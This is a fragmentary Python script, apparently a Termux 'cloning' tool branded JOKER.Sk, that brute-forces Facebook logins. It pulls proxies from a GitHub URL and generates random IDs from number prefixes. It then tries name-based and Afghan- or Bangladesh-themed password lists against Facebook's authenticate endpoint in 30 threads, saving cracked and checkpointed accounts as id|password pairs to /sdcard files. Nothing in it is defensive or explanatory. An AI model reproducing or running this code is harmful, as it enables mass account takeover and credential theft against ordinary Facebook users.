...
print('\n\033[1;32m   Join JOKER.Sk Group ');time.sleep(1)
os.system("xdg-open https://facebook.com/groups/892925915357288/")
print('\n\033[1;36m   WELCOME TO JOKER.Sk TOOLS...');time.sleep(3)
...
try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/MUSLIJOKER.Sk/main/.prox.txt').text
...
def file_cloning():
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\033[1;97m [+]-------------------------------------------------------')
                                        print("\033[1;32m [+] OK IDZ SAVE ✓ JOKER.Sk-OK.txt")
                                        print("\033[1;32m [+] CP IDZ SAVE × JOKER.Sk-CP.txt")
...
def afgan():
                ...
                with tred(max_workers=30) as AWM:     
                        ...
                        print('\033[1;97m [+]-------------------------------------------------------')
                        print("\033[1;97m [+]\033[1;32m OK IDZ SAVE ✓ JOKER.Sk-OK.txt")
                        print("\033[1;97m [+]\033[1;32m CP IDZ SAVE × JOKER.Sk-CP.txt")
                        ...
                        for psx in user:
                                ...
                                passlist = [psx,ids,psx[1:],'Afghan123','Afghanistan','afghan12345', 'afghanistan', 'afghan1234', 'afghan123','600700','۱۲۳۴۵۶۷۸۹',' ۱۲۳۴۵۶۷۸۹', '۱۲۳۴۵۶','khan123']
...
def bd():
                ...
                global lim
                clear()
                print('\033[1;31m [+] Code example: 88677 ,88021 ,88063 ,88019 ,83016 ,87015')
                code = input('\033[1;37m [+] put code: ')
                try:
                        limit = int(input('\033[1;31m [+] example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [JOKER.Sk-F1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [JOKER.Sk-F2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [JOKER.Sk-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JOKER.Sk-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [JOKER.Sk-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JOKER.Sk-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [JOKER.Sk-R] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/JOKER.Sk-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [JOKER.Sk-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/JOKER.Sk-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [JOKER.Sk-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JOKER.Sk-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
